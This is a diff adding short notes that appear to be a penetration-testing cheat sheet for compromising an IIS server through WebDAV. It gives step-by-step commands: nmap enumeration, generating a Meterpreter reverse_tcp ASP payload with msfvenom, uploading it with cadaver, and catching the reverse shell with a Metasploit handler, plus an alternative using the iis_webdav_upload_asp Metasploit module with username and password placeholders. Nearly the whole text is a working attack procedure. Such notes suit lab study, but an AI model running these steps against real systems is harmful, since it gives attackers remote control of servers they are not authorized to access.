@@ -1,0 +1,25 @@
+- Manually
+    - nmap -sV --script=http-enum -p80 TARGET_IP
+    - open in webbrowser
+        http://TARGET_IP/WEBDAV_DIR/
+    - msfvenom -p windows/meterpreter/reverse_tcp LHOST=LOCAL_HOST LPORT=4444 -f asp -o shell.asp
+    - cadaver http://TARGET_IP/WEBDAV_DIR
+    - put shell.asp
+    - msfconsole
+    - use multi/handler
+    - set payload windows/meterpreter/reverse_tcp
+        - always use the same payload as the payload sent to the webserver
+    - set LHOST LOCAL_HOST
+    - set LPORT 4444
+    - run
+    - Run the payload on the webdav directory on the server
+
+- Metasploit module
+    - msfconsole
+    - search iis upload
+    - use exploit/windows/iis/iis_webdav_upload_asp 
+    - set HttpPassword PASSWORD
+    - set HttpUsername USENAME
+    - set RHOSTS TARGET_IP
+    - set PATH /WEBDAV_DIR/
+    - run
